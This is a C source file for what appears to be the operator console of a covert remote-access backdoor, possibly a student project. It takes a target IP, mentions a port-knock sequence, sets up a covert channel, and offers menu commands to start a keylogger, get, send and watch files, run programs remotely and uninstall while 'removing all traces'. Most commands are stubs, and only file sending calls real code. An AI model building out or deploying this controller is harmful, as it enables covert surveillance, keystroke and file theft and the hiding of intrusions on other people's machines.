#include "commands.h"
#include "context.h"
#include "network.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define MAX_IP_LEN 16
#define MAX_INPUT_LEN 128
#define MAX_MENU 7

enum menu {
    DISCONNECT,
    UNINSTALL,
    START_KL,
    GET_FILE,
    SEND_FILE,
    WATCH_FILE,
    WATCH_DIR,
    REMOTE_RUN,
};

int print_menu(void){
    printf("-----------Choose Item-----------\n");
    printf("1. Uninstall\n");
    printf("2. Start keylogger\n");  // next screen prompts user to input 1 to stop logging then auto retrieves the log from the client
    printf("3. Get a file\n");
    printf("4. Send a file\n");
    printf("5. Watch a file\n"); // next screen prompts user to input 1 to stop watching otherwise it stays watching
    printf("6. Watch a directory\n"); // next screen prompts user to input 1 to stop watching otherwise it stays watching
    printf("7. Run a program\n");
    printf("0. Disconnect\n");

    return 0;
}

int prompt_ip(char *ip_buffer){
    printf("Enter IP address: ");
    if (fgets(ip_buffer, MAX_IP_LEN, stdin) != NULL) {
        ip_buffer[strcspn(ip_buffer, "\n")] = '\0';
        return 0;
    }
    return -1;
}

long get_choice(char *choice){
    char *end;
    long ret = strtol(choice, &end, 10);
    if (*end != '\0'){
        fprintf(stderr, "choice must be a number\n");
        return -1;
    }
    if (ret < 0 || ret > MAX_MENU) {
        fprintf(stderr, "choice cannot exceed possible choices\n");
        return -1;
    }

    return ret;
}

int main(void){
    int run = 1;
    char ip_buffer[MAX_IP_LEN] = "";
    char input_buffer[MAX_INPUT_LEN];

    struct Context ctx;
    memset(&ctx, 0, sizeof(ctx));

    while (prompt_ip(ip_buffer) != 0){
        fprintf(stderr, "Error reading client IP. Try again.\n");
    }

    memcpy(ctx.runner_ip, ip_buffer, MAX_IP_LEN);

    printf("Performing knock sequence at %s\n", ctx.runner_ip);
//    int ret = perform_knock(&ctx);
//    if (ret != 0) {
//        fprintf(stderr, "perform_knock error.\n");
//        return -1;
//    }
    printf("Knock sequence successfully completed.\n");

    long choice;

    // setting up context: create covert_fd, set seq_num = 0
    ctx.covert_fd = setup_covert_fd();
    if (ctx.covert_fd < 0) {
        fprintf(stderr, "Error setting up covert fd\n");
        return -1;
    }
    ctx.cmd_seq_num = 0;
    ctx.rep_seq_num = 0;

    srand((unsigned int)time(NULL));

    while(run){
        print_menu();

        if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL) {
            fprintf(stderr, "Input error.\n");
            break;
        }

        input_buffer[strcspn(input_buffer, "\n")] = '\0';
        choice = get_choice(input_buffer);
        if (choice == -1)
        {
            fprintf(stderr, "Choice error. Try Again.\n");
            continue;
        }
        
        switch(choice){
            case UNINSTALL:
                printf("Removing all traces...\n");
                break;
            case START_KL:
                printf("Starting key logger...\n");
                break;
            case GET_FILE:
                printf("Get file\n");
                break;
            case SEND_FILE:
                printf("Send file\n");
                cmd_send_file(&ctx);
                break;
            case WATCH_FILE:
                printf("Watching file...\n");
                break;
            case WATCH_DIR:
                printf("Watching dir...\n");
                break;
            case REMOTE_RUN:
                printf("Running remotely\n");
                break;
            case DISCONNECT:
                return EXIT_SUCCESS;
        }
    }

}
